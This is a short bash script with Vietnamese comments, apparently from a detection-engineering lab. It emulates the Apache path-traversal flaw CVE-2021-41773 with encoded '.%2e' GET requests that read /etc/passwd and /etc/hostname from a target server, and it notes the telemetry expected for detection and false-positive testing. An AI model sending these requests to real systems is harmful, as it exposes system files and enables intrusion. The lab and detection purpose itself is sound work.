#!/usr/bin/env bash
# v3_traversal_read.sh — V3: LFI / path-traversal đọc file ngoài docroot (CVE-2021-41773).
#
# Chạy từ máy ATTACKER trong lab:
#     bash v3_traversal_read.sh http://<victim>:8081
#
# Emulation CVE công khai: đọc file hệ thống (vd /etc/passwd) ngoài docroot.
# Đây là tiền đề cho log-poisoning→RCE, nhưng script này DỪNG ở bước đọc (không
# poison/không exec) để tạo telemetry V3 "thuần" phục vụ detection + benign twin.
set -euo pipefail
BASE="${1:?Usage: $0 http://<victim>:8081}"
BASE="${BASE%/}"

# Nhánh READ phải đi qua plain Alias (/docs/), KHÔNG qua ScriptAlias (/cgi-bin/):
# qua /cgi-bin/ thì mod_cgi đem file đi EXEC (500), không đọc được nội dung.
TARGETS=(
  "/docs/.%2e/.%2e/.%2e/.%2e/etc/passwd"
  "/docs/.%2e/.%2e/.%2e/.%2e/etc/hostname"
)

echo "[*] V3 / CVE-2021-41773 (path traversal read) → $BASE"
for t in "${TARGETS[@]}"; do
  echo "    --- GET $t ---"
  # --path-as-is BẮT BUỘC: thiếu nó curl tự collapse '..' → server nhận path chuẩn hoá → 404.
  curl -s --path-as-is "$BASE$t" | sed 's/^/        /' || true
done

cat <<'EOF'

[i] Kỳ vọng telemetry trên victim:
      access log httpd-lab: GET /docs/.%2e/.../etc/passwd  (200 = traversal thành công)
      KHÔNG có execve (đây là nhánh ĐỌC, để phân biệt với V2 exec)
      -> forward lên index=lab_web
[i] Benign twin của V3: một client đọc file HỢP LỆ trong docroot (vd /index.html)
    — cùng là 'GET file', khác bản chất. Dùng để đo FP.
EOF
